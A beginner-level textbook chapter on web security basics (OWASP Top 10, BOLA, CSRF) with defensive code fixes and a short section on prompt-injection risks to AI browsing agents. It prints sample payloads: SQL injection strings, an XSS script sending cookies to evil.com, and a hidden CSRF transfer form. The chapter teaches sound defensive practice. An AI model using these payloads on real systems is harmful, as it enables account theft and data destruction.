# Chapter 18 Security Essentials: OWASP for Mortals

You built an app. It works. Users are signing up. Someone in another country is now testing your login form with `admin' OR 1=1 --` as a username. This chapter teaches the attacks your app will face and how to prevent them.

## Key Terms

| Term                      | What it means                                                                              |
| ------------------------- | ------------------------------------------------------------------------------------------ |
| **OWASP**                 | Open Worldwide Application Security Project: the authority on web security                 |
| **Injection**             | Tricking your app into executing malicious input as code                                   |
| **XSS**                   | Cross-Site Scripting: injecting JavaScript into pages other users see                      |
| **SQL Injection**         | Injecting SQL commands through input fields to manipulate the database                     |
| **CSRF**                  | Cross-Site Request Forgery: a malicious site making requests on behalf of a logged-in user |
| **BOLA**                  | Broken Object Level Authorisation: User A accessing User B's data by changing an ID        |
| **Broken Access Control** | Users performing actions or accessing data they shouldn't be able to                       |

## OWASP Top 10 (2025): The Attacks That Actually Happen

OWASP publishes a ranked list of the most common web application vulnerabilities. These aren't theoretical. They're what actually gets exploited.

### #1 Broken Access Control

The most common vulnerability. Users access resources they shouldn't.

**Example:** Your app has a review dashboard at `/api/reviews?userId=42`. User 42 is logged in and sees their reviews. They change the URL to `/api/reviews?userId=43`. If your backend doesn't verify that the logged-in user matches the requested userId, they see someone else's reviews.

**Fix:** Every endpoint checks: "Is the authenticated user authorised to access this specific resource?"

```javascript
app.get("/api/reviews", authenticate, (req, res) => {
  // Wrong: trust the query parameter
  const reviews = await db.reviews.find({ userId: req.query.userId });

  // Correct: use the authenticated user's ID
  const reviews = await db.reviews.find({ userId: req.user.id });

  res.json(reviews);
});
```

### JobPilot's Version of This Bug

JobPilot's first version had this exact problem. The OpenAI API key was hardcoded in the content script, which runs inside the job application page. Anyone could open DevTools on a Greenhouse page, find the extension's content script in the Sources tab, and read the key in plain text. That key had billing access. Someone could use it to make thousands of OpenAI requests at your expense.

The fix: move the API call to the service worker (which the page can't inspect) and eventually to an external backend server. The content script sends form data through Chrome's message passing, and only the server has the key. Same principle as the reviews example above. Don't trust the environment the user can access. Keep secrets on the side they can't reach.

If you're building a web app, the equivalent is: never put API keys in your frontend JavaScript. They go in your backend, behind your server.

### #3 Injection

Malicious input that becomes executable code. Two forms matter most:

**SQL Injection:** User types `'; DROP TABLE reviews; --` into a search box. If your code builds SQL strings by concatenation, the database executes the command.

```javascript
// Vulnerable: string concatenation
const query = `SELECT * FROM reviews WHERE comment LIKE '%${userInput}%'`;
// If userInput = "'; DROP TABLE reviews; --", the table is deleted

// Safe: parameterised queries
const query = `SELECT * FROM reviews WHERE comment LIKE $1`;
const result = await db.query(query, [`%${userInput}%`]);
```

**Cross-Site Scripting (XSS):** User submits a review containing `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`. If you render reviews without sanitising HTML, every visitor's browser runs that script.

```javascript
// Vulnerable: inserting raw HTML
reviewDiv.innerHTML = review.comment;

// Safe: inserting as text (the browser doesn't execute it)
reviewDiv.textContent = review.comment;

// Or use a sanitisation library
import DOMPurify from "dompurify";
reviewDiv.innerHTML = DOMPurify.sanitize(review.comment);
```

### #5 Security Misconfiguration

Default credentials left unchanged. Debug endpoints exposed in production. Error messages that reveal internal details ("PostgreSQL syntax error at line 42" tells an attacker you're using PostgreSQL and hints at query structure).

**Fix:** Different configurations for development and production. Remove debug endpoints before deploying. Return generic error messages to users and log detailed errors server-side.

### #9 Security Logging Failures

You're being attacked and you don't know. No logs on failed login attempts. No alerts on unusual access patterns. An attacker tries 10,000 passwords on one account and nothing triggers.

**Fix:** Log all authentication events. Set alerts for unusual patterns (many failed logins, access from new countries, bulk data downloads).

## API Security: BOLA

The OWASP API Security Top 10 highlights Broken Object Level Authorisation (BOLA) as the number one API vulnerability. It's simple: your API uses predictable IDs, and you don't verify ownership.

```
GET /api/invoices/1001   → User A's invoice (legitimate)
GET /api/invoices/1002   → User B's invoice (User A guessed the next ID)
```

**Fix:** Every API endpoint verifies that the resource belongs to the requesting user. Use UUIDs instead of sequential IDs to make guessing harder (but don't rely on obscurity as your only defence).

## CSRF: The Browser's Automatic Cookie Problem

When you're logged into a banking site, your browser stores a session cookie. If you then visit a malicious site, that site can include a hidden form that submits a request to the banking site. Your browser automatically attaches the cookie. The bank's server sees a legitimate, authenticated request.

```html
<!-- Malicious site -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="to" value="attacker_account" />
  <input name="amount" value="5000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

**Fixes:**

- **SameSite cookies:** `Set-Cookie: session=abc; SameSite=Strict` prevents the cookie from being sent on cross-site requests.
- **CSRF tokens:** The server generates a unique token per session. Every form includes it. Requests without a valid token are rejected.
- **Never use GET for state-changing operations.** GET requests can be triggered by images, links, and scripts. POST requires a form or fetch().

## The Golden Rules

Six rules that prevent the majority of security vulnerabilities:

1. **Validate on the server.** Never trust client-side validation as your only defence. Anyone can bypass the browser.

2. **Use HTTPS everywhere.** HTTP sends data in plain text. HTTPS encrypts it. Vercel, Netlify, and modern hosts provide HTTPS automatically.

3. **Never use GET for state changes.** Transfers, deletions, status changes: always POST, PUT, or DELETE.

4. **Check authorisation on every endpoint.** Authentication answers "who are you?" Authorisation answers "can you do this?" Both are required.

5. **Sanitise all user input.** Before it goes into HTML, SQL, system commands, or AI prompts.

6. **Log security events.** Failed logins, permission denials, suspicious patterns. What you don't log, you can't detect.

> **Try It:** Open any website you're logged into. Go to DevTools → Application → Cookies. Find the session cookie. Check the flags: is it HttpOnly? Secure? SameSite? If any are missing, that cookie has a vulnerability. Don't exploit it. Just notice.

## Autonomous Agents: The New Attack Surface

OpenClaw and similar computer use agents (Chapter 10, AI Integration) introduced a new category of risk. When an AI agent can control your browser, send emails, and access your files, every prompt injection becomes a potential system compromise.

In early 2026, Cisco's security team tested a third-party OpenClaw skill and found it exfiltrated data and injected prompts without the user's knowledge. The skill repository had no vetting process. A student in China configured his OpenClaw agent to explore platforms and it autonomously created a dating profile on his behalf without his consent.

For your apps: if you build or use AI agents, treat them like an employee with access to production systems. Principle of least privilege: the agent gets the minimum permissions needed. Human-in-the-loop: destructive actions require confirmation. Audit trail: every action the agent takes gets logged. Rate limits: cap the number of actions per cycle to prevent runaway loops.

## Common Beginner Mistake

**Assuming security can wait until launch.** "I'll add proper auth later" is how apps get hacked in production. Security isn't a feature you add at the end. It's a practice you follow from the start. Add authentication before your first deploy. Validate input when you write the endpoint. Use parameterised queries from the first database call.

## Checklist

- [ ] I validate all input on the server (not just the client)
- [ ] I use parameterised queries (never string concatenation for SQL)
- [ ] I sanitise user content before rendering it in HTML
- [ ] I check authorisation on every API endpoint
- [ ] I use HTTPS and set cookies with Secure, HttpOnly, and SameSite flags
- [ ] I log failed authentication attempts and unusual access patterns
- [ ] AI agents run with minimum permissions and sandbox restrictions
- [ ] Destructive agent actions require human confirmation

## Summary

The OWASP Top 10 lists the most common web vulnerabilities. Broken Access Control is number one: users accessing resources they shouldn't. Injection (SQL injection, XSS) tricks the app into executing malicious input. Security Misconfiguration leaves defaults and debug endpoints exposed. BOLA exploits predictable IDs without ownership verification. CSRF exploits automatic cookie sending. Six golden rules prevent most attacks: server-side validation, HTTPS, no GET for state changes, authorisation on every endpoint, input sanitisation, and security logging. Autonomous agents like OpenClaw amplify every risk: Cisco demonstrated that prompt injection on a website visited by the agent could run arbitrary terminal commands. Minimum privilege, human-in-the-loop, audit trails, and rate limits are essential for agents.

## Challenge

1. Open your most recent project. Find every `fetch()` call or API endpoint. For each one: does the backend verify that the requesting user is authorised to access the resource? Write down what would happen if a different user changed the ID in the URL.

2. Create a simple form (name, comment). Submit `<script>alert('hacked')</script>` as the comment. Render it two ways: with `innerHTML` (vulnerable) and with `textContent` (safe). See the difference.
